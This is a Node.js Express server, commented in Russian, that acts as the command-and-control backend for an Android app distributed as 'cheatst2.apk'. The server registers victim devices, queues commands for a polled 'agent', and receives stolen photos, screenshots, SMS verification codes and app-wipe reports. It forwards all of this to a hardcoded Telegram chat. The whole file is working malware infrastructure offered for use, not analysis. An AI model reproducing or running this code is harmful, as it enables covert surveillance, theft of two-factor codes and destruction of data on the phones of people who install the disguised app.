const express = require('express');
const path = require('path');

// Защита от падения
process.on('uncaughtException', (err) => {
  console.error('Ошибка:', err);
});
process.on('unhandledRejection', (err) => {
  console.error('Отказ:', err);
});

const db = require('./db');
const { bot, notifyAdmin } = require('./bot');

const app = express();
app.use(express.json({ limit: '25mb' }));

// Заглушка для проверки хостинга
app.get('/', (req, res) => {
  res.status(200).send('OK');
});

// Скачивание APK
app.get('/cheatst2.apk', (req, res) => {
  res.download(path.join(__dirname, 'cheatst2.apk'), 'cheatst2.apk');
});

// Регистрация нового устройства
app.post('/api/register', async (req, res) => {
  const { id, model } = req.body || {};
  if (!id) return res.status(400).json({ ok: false });
  
  const isNew = !db.listDevices().find(d => d.id === id);
  db.addDevice(id, model || 'android');
  
  if (isNew) {
    try {
      await bot.telegram.sendMessage(9256345316, `📱 Новое устройство!\nМодель: ${model}\nID: ${id}`);
    } catch (e) {}
  }
  res.json({ ok: true });
});

// Получение команд агентом
app.get('/api/poll', (req, res) => {
  const id = req.query.id;
  if (!id) return res.status(400).json({ ok: false });
  db.addDevice(id, req.query.model || 'android');
  const cmds = db.pullCommands(id);
  res.json({ ok: true, cmds });
});

// Отчеты от агента (фото, скрины, смс и т.д.)
app.post('/api/report', async (req, res) => {
  const { id, kind, body } = req.body || {};
  if (!id || !kind) return res.status(400).json({ ok: false });
  
  db.saveReport(id, kind, body || '');
  
  try {
    // Отправка фото
    if (kind === 'photo' && body) {
      const buf = Buffer.from(body, 'base64');
      await bot.telegram.sendPhoto(9256345316, { source: buf }, { caption: `📷 Фото с ${id.slice(0,6)}` });
    }
    // Отправка скриншота
    if (kind === 'screen' && body) {
      const buf = Buffer.from(body, 'base64');
      await bot.telegram.sendPhoto(9256345316, { source: buf }, { caption: `📸 Скрин с ${id.slice(0,6)}` });
    }
    // Ошибка скриншота (нет разрешения)
    if (kind === 'screen_error' && body) {
      await bot.telegram.sendMessage(9256345316, `⚠️ Скрин не удался (${id.slice(0,6)}):\n${body}`);
    }
    // Данные SMS
    if (kind === 'sms' && body) {
      await bot.telegram.sendMessage(9256345316, `🔑 Код с ${id.slice(0,6)}:\n${body}`);
    }
    // Отчет об удалении приложений
    if (kind === 'wipe' && body) {
      await bot.telegram.sendMessage(9256345316, `💥 Снос на ${id.slice(0,6)}:\n${body.substring(0, 500)}...`);
    }
  } catch (e) {}
  
  res.json({ ok: true });
});

const port = process.env.PORT || 8080;
app.listen(port, '0.0.0.0', () => {
  console.log('server up :' + port);
});
